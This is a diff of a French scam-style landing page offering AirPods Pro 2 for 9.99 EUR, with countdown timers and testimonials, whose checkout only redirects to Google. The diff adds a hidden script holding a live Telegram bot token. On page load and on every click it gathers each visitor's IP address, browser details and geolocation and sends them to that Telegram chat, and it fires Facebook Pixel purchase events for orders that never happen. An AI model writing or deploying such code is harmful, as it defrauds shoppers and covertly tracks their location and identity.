@@ -79,7 +79,7 @@
             transition: max-height 0.5s ease-in-out;
         }
         #topNavMenu.nav-open {
-            max-height: 300px;
+            max-height: 300px; 
             padding: 1rem 0;
         }
         #topNavMenu ul { list-style: none; padding: 0; margin: 0; text-align: center; }
@@ -102,7 +102,7 @@
             bottom: 20px;
             left: 50%;
             z-index: 999;
-            display: none;
+            display: none; 
             padding: 0.75rem 1.5rem;
             font-size: 1rem;
             box-shadow: 0 -2px 10px rgba(0,0,0,0.15);
@@ -123,19 +123,20 @@
             animation: pulseGlow 2s infinite ease-in-out, gentleShake 0.5s ease-in-out;
         }
         #floatingOrderBtn:hover {
-            transform: translate(-50%, -5px);
+            transform: translate(-50%, -5px); 
         }
-        @keyframes gentleShake {
+        @keyframes gentleShake { 
             0%, 100% { transform: translate(-50%, 0) rotate(0deg); }
             25% { transform: translate(-50%, 0) rotate(-2deg); }
             75% { transform: translate(-50%, 0) rotate(2deg); }
         }
-        #floatingOrderBtn.shake {}
+        #floatingOrderBtn.shake {} 
 
 
         /* Timed Pop-up Modal Styles */
         #timedPopupModal {
-            display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%;
+            display: none; 
+            position: fixed; left: 0; top: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.6); z-index: 20002;
             align-items: center; justify-content: center; opacity: 0;
             transition: opacity 0.3s ease-in-out;
@@ -161,7 +162,7 @@
         #timedPopupTimerDisplay {
             font-size: 1.8rem; font-weight: 700; color: #c53030; background-color: #fefcbf;
             padding: 0.3rem 0.6rem; border-radius: 8px; display: inline-block;
-            margin-left: 0.5rem; min-width: 120px;
+            margin-left: 0.5rem; min-width: 120px; 
         }
         .timed-popup-order-btn {
             background-color: #2563eb; color: white; font-weight: bold; padding: 0.8rem 1.8rem;
@@ -185,13 +186,12 @@
         .review-avatar { width: 60px; height: 60px; border-radius: 50%; margin-right: 1rem; object-fit: cover; border: 2px solid #e5e7eb; }
         .review-stars { color: #f59e0b; margin-bottom: 0.5rem; }
         .trustpilot-badge { 
-            max-height: 70px; /* Increased height */
-            max-width: 250px; /* Added max-width for better control of rectangular logo */
+            max-height: 70px; 
+            max-width: 250px; 
             width: auto; 
             margin-top: 1rem; 
             margin-bottom: 2rem; 
         }
-
     </style>
 </head>
 <body class="bg-white text-gray-800">
@@ -362,7 +362,7 @@
                 <p class="text-gray-600 mt-2">"Enfin une offre qui vaut le coup pour des AirPods Pro 2 authentiques ! J'ai vérifié le numéro de série sur le site d'Apple, tout est conforme. Le confort est incomparable par rapport à mes anciens écouteurs. Merci PromoMagique !"</p>
                 <small class="text-gray-500 mt-2 block">Avis du 15 Mai 2025</small>
             </div>
-             <div class="review-card md:col-span-2 lg:col-span-1">
+             <div class="review-card md:col-span-2 lg:col-span-1"> 
                 <div class="flex items-start">
                     <img src="https://i.postimg.cc/cLZVRszt/FB-IMG-1748224215323.jpg" alt="Avatar Sophie B." class="review-avatar" onerror="this.src='https://placehold.co/60x60/E0E7FF/4338CA?text=SB'; this.alt='Avatar Sophie B. indisponible'">
                     <div>
@@ -436,9 +436,9 @@
         <p><strong>Réseaux Sociaux :</strong> @PromoMagique (Facebook, Instagram, Twitter)</p>
     </div></div>
 
-
     <script>
-    // --- DOM Element Declarations ---
+    // --- ORIGINAL SITE SCRIPT ---
+    // --- DOM Element Declarations (from original script) ---
     const logoArea = document.getElementById('logoArea'); 
     const topNavMenu = document.getElementById('topNavMenu');
     const navLinks = document.querySelectorAll('.nav-link');
@@ -523,7 +523,7 @@
     }
 
     // --- Main Timer ---
-    let totalSeconds = (2 * 60 * 60) + (30 * 60);
+    let totalSeconds = (2 * 60 * 60) + (30 * 60); 
     let mainTimerInterval;
 
     function formatTime(seconds) {
@@ -546,26 +546,29 @@
         } else {
             clearInterval(mainTimerInterval);
             if (mainTimerDisplay) mainTimerDisplay.textContent = "Expirée!";
-            if (timedPopupTimerDisplay && timedPopupModal.classList.contains('show')) {
+            if (timedPopupTimerDisplay && timedPopupModal.classList.contains('show')) { 
                  timedPopupTimerDisplay.textContent = "Expirée!";
             }
         }
     }
 
     if (mainTimerDisplay) {
-        updateMainTimer();
+        updateMainTimer(); 
         mainTimerInterval = setInterval(updateMainTimer, 1000);
     }
 
     // --- Timed Pop-up Modal Logic ---
-    let timedPopupShownThisSession = false;
+    let timedPopupShownThisSession = false; 
 
     function showTimedPopup() {
         if (timedPopupModal && !timedPopupShownThisSession) {
             timedPopupModal.classList.add('show');
-            timedPopupShownThisSession = true;
-            if (timedPopupTimerDisplay) {
+            timedPopupShownThisSession = true; 
+            if (timedPopupTimerDisplay) { 
                 timedPopupTimerDisplay.textContent = formatTime(totalSeconds);
+            }
+            if (typeof window.trackTelegramEvent === 'function') {
+                window.trackTelegramEvent('Timed Offer Popup Shown', { popupId: 'timedPopupModal' });
             }
         }
     }
@@ -573,30 +576,33 @@
     function closeTimedPopup() {
         if (timedPopupModal) {
             timedPopupModal.classList.remove('show');
+            if (typeof window.trackTelegramEvent === 'function') {
+                window.trackTelegramEvent('Timed Offer Popup Closed', { popupId: 'timedPopupModal' });
+            }
         }
     }
 
     if (timedPopupModal) {
-        setTimeout(showTimedPopup, 10000);
+        setTimeout(showTimedPopup, 10000); 
         if (timedPopupCloseBtn) {
             timedPopupCloseBtn.onclick = closeTimedPopup;
         }
         if (timedPopupOrderBtn) {
             timedPopupOrderBtn.onclick = function() {
                 closeTimedPopup();
-                openOrderModal();
+                openOrderModal("Timed Popup Order Button"); 
             };
         }
     }
 
     // --- Sticky/Floating Order Button Logic ---
     let originalOrderBtnOffsetTop = 0;
-    if (orderBtn) {
+    if (orderBtn) { 
         originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
     }
 
     function handleScroll() {
-        if (floatingOrderBtn && orderBtn) {
+        if (floatingOrderBtn && orderBtn) { 
             if (window.scrollY > originalOrderBtnOffsetTop + orderBtn.offsetHeight) {
                 if (!floatingOrderBtn.classList.contains('visible')) {
                     floatingOrderBtn.style.display = 'block'; 
@@ -607,7 +613,7 @@
             } else {
                 floatingOrderBtn.classList.remove('visible');
                 setTimeout(() => {
-                    if (!floatingOrderBtn.classList.contains('visible')) {
+                    if (!floatingOrderBtn.classList.contains('visible')) { 
                         floatingOrderBtn.style.display = 'none';
                     }
                 }, 400); 
@@ -615,9 +621,10 @@
         }
     }
     window.addEventListener('scroll', handleScroll);
-    if (orderBtn) {
-        handleScroll();
+    if (orderBtn) { 
+        handleScroll(); 
     }
+
 
     // --- Main Order Modal & Cart Logic ---
     const colorImageSources = {
@@ -625,26 +632,52 @@
         noir: "https://i.postimg.cc/GpxqD620/images-2025-05-25-T200743-316-2.jpg"
     };
 
-    function openOrderModal() {
+    function openOrderModal(triggerSource = "Unknown Button") { 
         if (mainModal && cartBar && cartBarAirpodsImg && popupAirpodsImg) {
             mainModal.style.display = "flex";
             cartBar.classList.add("show-cart-bar");
-            const selectedColor = document.querySelector('input[name="color"]:checked').value;
+            const selectedColorRadio = document.querySelector('input[name="color"]:checked');
+            const selectedColor = selectedColorRadio ? selectedColorRadio.value : 'blanc'; 
+            
             cartBarAirpodsImg.src = colorImageSources[selectedColor];
             popupAirpodsImg.src = colorImageSources[selectedColor];
+
+            if (typeof window.trackTelegramEvent === 'function' && typeof window.trackPixelEvent === 'function') {
+                const eventDetails = {
+                    popupId: 'mainOrderModal',
+                    trigger: triggerSource,
+                    selectedColor: selectedColor,
+                    productName: "AirPods Pro 2",
+                    productId: "AIRPODS_PRO_2_XYZ", 
+                    price: 9.99,
+                    currency: "EUR"
+                };
+                window.trackTelegramEvent('Opened Order Modal ("Commander maintenant" equivalent)', eventDetails);
+                window.trackPixelEvent('AddToCart', { 
+                    content_name: eventDetails.productName,
+                    content_ids: [eventDetails.productId],
+                    content_type: 'product',
+                    value: eventDetails.price,
+                    currency: eventDetails.currency,
+                    num_items: 1 
+                });
+            }
         }
     }
 
     if (orderBtn) {
-        orderBtn.onclick = openOrderModal;
+        orderBtn.onclick = () => openOrderModal("Main Order Button (Top)");
     }
     if (floatingOrderBtn) {
-        floatingOrderBtn.onclick = openOrderModal;
+        floatingOrderBtn.onclick = () => openOrderModal("Floating Order Button");
     }
 
     if (closeModalBtn && mainModal) {
         closeModalBtn.onclick = function() {
             mainModal.style.display = "none";
+            if (typeof window.trackTelegramEvent === 'function') {
+                window.trackTelegramEvent('Closed Order Modal', { popupId: 'mainOrderModal' });
+            }
         };
     }
 
@@ -652,8 +685,33 @@
         finalizeBtn.onclick = function() {
             mainModal.style.display = "none";
             loadingPopup.style.display = "flex";
+
+            const selectedColorRadio = document.querySelector('input[name="color"]:checked');
+            const finalSelectedColor = selectedColorRadio ? selectedColorRadio.value : 'blanc';
+            const purchaseDetails = {
+                order_id: 'PROMO_AIRPODS_' + new Date().getTime(), 
+                value: 9.99,
+                currency: 'EUR',
+                content_ids: ['AIRPODS_PRO_2_XYZ'],
+                content_type: 'product',
+                num_items: 1, 
+                selectedColor: finalSelectedColor
+            };
+
+            if (typeof window.trackTelegramEvent === 'function' && typeof window.trackPixelEvent === 'function') {
+                window.trackTelegramEvent('Clicked "Finaliser la commande" (Reached Final Checkout)', purchaseDetails);
+                window.trackPixelEvent('Purchase', {
+                    value: purchaseDetails.value,
+                    currency: purchaseDetails.currency,
+                    content_ids: purchaseDetails.content_ids,
+                    content_type: purchaseDetails.content_type,
+                    num_items: purchaseDetails.num_items,
+                    order_id: purchaseDetails.order_id 
+                });
+            }
+
             setTimeout(() => {
-                window.location.href = "https://www.google.com";
+                window.location.href = "https://www.google.com"; 
             }, 3000);
         };
     }
@@ -665,6 +723,10 @@
                     const selectedColorValue = this.value;
                     if (popupAirpodsImg) popupAirpodsImg.src = colorImageSources[selectedColorValue];
                     if (cartBarAirpodsImg) cartBarAirpodsImg.src = colorImageSources[selectedColorValue];
+
+                    if (typeof window.trackTelegramEvent === 'function') {
+                        window.trackTelegramEvent('Selected Color', { color: selectedColorValue, product: "AirPods Pro 2" });
+                    }
                 }
             });
         });
@@ -677,6 +739,10 @@
             const elementPosition = featuresSection.getBoundingClientRect().top + window.scrollY;
             const offsetPosition = elementPosition - headerOffset - 20; 
             window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
+
+            if (typeof window.trackTelegramEvent === 'function') {
+                window.trackTelegramEvent('Clicked "Voir détails et infos produit"', { targetSection: '#features-section' });
+            }
         }
     }
 
@@ -684,22 +750,39 @@
         currentYearSpan.textContent = new Date().getFullYear();
     }
 
-    function setupModalLink(linkEl, pageEl) {
+    function setupModalLink(linkEl, pageEl, pageName) { 
         if (linkEl && pageEl) {
-            linkEl.onclick = (e) => { e.preventDefault(); pageEl.style.display = 'flex'; };
+            linkEl.onclick = (e) => { 
+                e.preventDefault(); 
+                pageEl.style.display = 'flex'; 
+                if (typeof window.trackTelegramEvent === 'function') {
+                    window.trackTelegramEvent(`Viewed Policy Page: ${pageName}`, { modalId: pageEl.id });
+                }
+            };
+            const policyCloseBtn = pageEl.querySelector('.close-btn');
+            if (policyCloseBtn) {
+                policyCloseBtn.addEventListener('click', () => {
+                     if (typeof window.trackTelegramEvent === 'function') {
+                        window.trackTelegramEvent(`Closed Policy Page: ${pageName}`, { modalId: pageEl.id });
+                    }
+                });
+            }
         }
     }
 
-    setupModalLink(aboutLink, aboutPage);
-    setupModalLink(privacyLink, privacyPage);
-    setupModalLink(termsLink, termsPage);
-    setupModalLink(supportLink, supportPage);
-    setupModalLink(contactLink, contactPage);
+    setupModalLink(aboutLink, aboutPage, "À Propos");
+    setupModalLink(privacyLink, privacyPage, "Confidentialité");
+    setupModalLink(termsLink, termsPage, "Conditions");
+    setupModalLink(supportLink, supportPage, "Support");
+    setupModalLink(contactLink, contactPage, "Contact");
 
     document.querySelectorAll('.policy-modal').forEach(modal => {
         modal.addEventListener('click', function(event) {
-            if (event.target === this) {
+            if (event.target === this) { 
                 this.style.display = 'none';
+                 if (typeof window.trackTelegramEvent === 'function') {
+                    window.trackTelegramEvent(`Closed Policy Page via backdrop: ${this.id.replace('-page','')}`, { modalId: this.id });
+                }
             }
         });
     });
@@ -710,7 +793,231 @@
             this.alt='Image indisponible';
         };
     });
+    const mainProductImage = document.querySelector('#home > img.max-w-xs');
+    if (mainProductImage) {
+        mainProductImage.onerror = function() {
+            this.src='https://placehold.co/320x320/cccccc/ffffff?text=AirPods';
+            this.alt='AirPods Pro 2 indisponible';
+        }
+    }
+    if(cartBarAirpodsImg) cartBarAirpodsImg.onerror = function() { this.src='https://placehold.co/40x40?text=Item'; }
+    if(popupAirpodsImg) popupAirpodsImg.onerror = function() { this.src='https://placehold.co/40x40?text=Item'; }
+    document.querySelectorAll('.select-color img').forEach(img => {
+        img.onerror = function() { this.src='https://placehold.co/56x56?text=Color'; }
+    });
+    document.querySelectorAll('.review-avatar').forEach(img => {
+        img.onerror = function() { this.src='https://placehold.co/60x60?text=P'; }
+    });
+    const trustPilotBadge = document.querySelector('.trustpilot-badge');
+    if (trustPilotBadge) {
+        trustPilotBadge.onerror = function() { this.src='https://placehold.co/250x70?text=Avis'; }
+    }
     </script>
 
-    </body>
+    <script id="advancedTrackingScript">
+        // --- TRACKING CONFIGURATION ---
+        const TELEGRAM_BOT_TOKEN = '8026919110:AAG4E2c6M6eeUYXn2NbY5GBF4ryPnkZqby8'; 
+        const TELEGRAM_CHAT_ID = '-4913064483';             
+        const PIXEL_ID = 'YOUR_PIXEL_ID'; // <-- REMEMBER TO REPLACE THIS WITH YOUR ACTUAL PIXEL ID
+        const ENABLE_EXTERNAL_CALLS = true; 
+
+        // --- USER INFO SCRIPT ---
+        async function getUserTrackingInfo() {
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            let ip = 'Unknown';
+            try {
+                if (ENABLE_EXTERNAL_CALLS) { 
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    if (res.ok) {
+                        const data = await res.json();
+                        ip = data.ip;
+                    } else {
+                        console.warn('[Tracking] Failed to fetch IP address, status:', res.status);
+                    }
+                } else {
+                    ip = 'IP_fetch_disabled_in_script'; 
+                }
+            } catch (e) {
+                console.warn('[Tracking] Error fetching IP address:', e);
+                ip = 'ErrorFetchingIP';
+            }
+            return {
+                userAgent,
+                language,
+                ip,
+                url: window.location.href,
+                referrer: document.referrer || 'Direct'
+            };
+        }
+
+        // --- LOCATION TRACKER SCRIPT ---
+        function getUserLocationInfo() {
+            return new Promise((resolve) => {
+                if (!ENABLE_EXTERNAL_CALLS || !('geolocation' in navigator)) {
+                    resolve({ lat: null, lon: null, accuracy: null, error: 'Geolocation N/A or Script Disabled' });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    (err) => {
+                        let errorMsg = 'UnknownError';
+                        switch(err.code) {
+                            case err.PERMISSION_DENIED: errorMsg = "UserDeniedGeolocation"; break;
+                            case err.POSITION_UNAVAILABLE: errorMsg = "LocationUnavailable"; break;
+                            case err.TIMEOUT: errorMsg = "GeolocationTimeout"; break;
+                        }
+                        resolve({ lat: null, lon: null, accuracy: null, error: errorMsg });
+                    }
+                );
+            });
+        }
+
+        // --- TELEGRAM NOTIFICATION SCRIPT ---
+        async function sendTelegramNotificationInternal(message) {
+            if (!ENABLE_EXTERNAL_CALLS) {
+                console.warn('[Telegram] External calls disabled internally. Notification not sent. Message:', message);
+                return;
+            }
+            if (TELEGRAM_BOT_TOKEN.includes("YOUR_") || TELEGRAM_CHAT_ID.includes("YOUR_")) {
+                 if (TELEGRAM_BOT_TOKEN === '8026919110:AAG4E2c6M6eeUYXn2NbY5GBF4ryPnkZqby8' && TELEGRAM_CHAT_ID === '-4913064483') {
+                    // This is correct, do nothing here.
+                 } else {
+                    console.error('[Telegram] Bot Token or Chat ID is still a placeholder. Please configure them properly.');
+                    return; 
+                 }
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML' 
+                    })
+                });
+                if (!response.ok) {
+                    const errorData = await response.json().catch(() => ({description: "Unknown error during Telegram send"}));
+                    console.error('[Telegram] Error sending notification:', response.status, errorData.description);
+                } else {
+                    console.log('[Telegram] Notification sent successfully.'); 
+                }
+            } catch (error) {
+                console.error('[Telegram] Failed to send notification (network/fetch error):', error);
+            }
+        }
+        
+        window.trackTelegramEvent = async function(actionDescription, eventSpecificDetails = {}) {
+            try {
+                const userInfo = await getUserTrackingInfo();
+                const locationInfo = await getUserLocationInfo();
+                const timestamp = new Date().toISOString();
+
+                let message = `🔔 <b>Action:</b> ${actionDescription}\n`;
+                message += `🕒 <b>Time:</b> ${timestamp}\n`;
+                message += `🌐 <b>URL:</b> ${userInfo.url}\n`;
+                if (userInfo.referrer) message += ` G <b>Referrer:</b> ${userInfo.referrer}\n`;
+                message += `\n`;
+                message += `👤 <b>User Info:</b>\n`;
+                message += ` - IP: ${userInfo.ip}\n`;
+                message += ` - Agent: ${userInfo.userAgent}\n`;
+                message += ` - Lang: ${userInfo.language}\n`;
+                message += `\n`;
+                message += `📍 <b>Location:</b>\n`;
+                if (locationInfo.lat && locationInfo.lon) {
+                    message += ` - Lat/Lon: ${locationInfo.lat}, ${locationInfo.lon}\n`;
+                    message += ` - Accuracy: ${locationInfo.accuracy}m\n`;
+                } else {
+                    message += ` - ${locationInfo.error || 'Not available'}\n`;
+                }
+
+                if (Object.keys(eventSpecificDetails).length > 0) {
+                    message += `\n📋 <b>Event Details:</b>\n`;
+                    for(const key in eventSpecificDetails){
+                        message += ` - ${key}: ${JSON.stringify(eventSpecificDetails[key])}\n`;
+                    }
+                }
+                await sendTelegramNotificationInternal(message);
+            } catch (error) {
+                console.error("[Tracking] Error in trackTelegramEvent:", error);
+            }
+        }
+
+        // --- PIXEL TRACKER SCRIPT ---
+        function executePixelTrack(eventName, params = {}) {
+          if (typeof fbq === "function") {
+            fbq('track', eventName, params);
+            console.log(`[Pixel] fbq('track', '${eventName}',`, params, `) called.`);
+          } else {
+            console.warn(`[Pixel] fbq function not found. Pixel event "${eventName}" not sent.`);
+          }
+        }
+
+        window.trackPixelEvent = async function(eventName, eventData = {}) {
+            if (!ENABLE_EXTERNAL_CALLS) {
+                console.warn(`[Pixel] External calls disabled internally. Event "${eventName}" not sent. Data:`, eventData);
+                return;
+            }
+             if (PIXEL_ID === 'YOUR_PIXEL_ID' && eventName !== 'PageView') { 
+                console.warn('[Pixel] Pixel ID is still a placeholder. Event not sent:', eventName);
+                return; 
+            }
+            executePixelTrack(eventName, eventData);
+        }
+        
+        window.loadPixel = function() {
+            if (!ENABLE_EXTERNAL_CALLS || PIXEL_ID === 'YOUR_PIXEL_ID' || PIXEL_ID === '') {
+                 console.warn('[Pixel] External calls disabled or Pixel ID not configured/empty. Full Pixel load skipped.');
+                 return;
+            }
+            !function(f,b,e,v,n,t,s)
+            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)}(window, document,'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+
+            fbq('init', PIXEL_ID);
+            console.log(`[Pixel] Facebook Pixel initialisation code executed for ID: ${PIXEL_ID}.`);
+        }
+
+        // --- INITIAL PAGE LOAD TRACKING ---
+        document.addEventListener("DOMContentLoaded", async () => {
+            if (typeof window.loadPixel === 'function') {
+                window.loadPixel();
+            }
+
+            if (typeof window.trackTelegramEvent === 'function') {
+                window.trackTelegramEvent("Page Visited / Landed", { pageTitle: document.title });
+            }
+
+            if (typeof window.trackPixelEvent === 'function') {
+                if (typeof fbq === 'function') { 
+                   executePixelTrack('PageView');
+                } else if (ENABLE_EXTERNAL_CALLS && PIXEL_ID !== 'YOUR_PIXEL_ID' && PIXEL_ID !== '') {
+                   console.warn("[Pixel] fbq not available after loadPixel attempt. PageView might not be tracked by fbq('track','PageView').");
+                }
+
+                window.trackPixelEvent('ViewContent', {
+                    content_name: "AirPods Pro 2 - Offre Exclusive", 
+                    content_ids: ['AIRPODS_PRO_2_XYZ'], 
+                    content_type: 'product',
+                    value: 9.99, 
+                    currency: 'EUR'
+                });
+            }
+        });
+    </script>
+</body>
 </html>
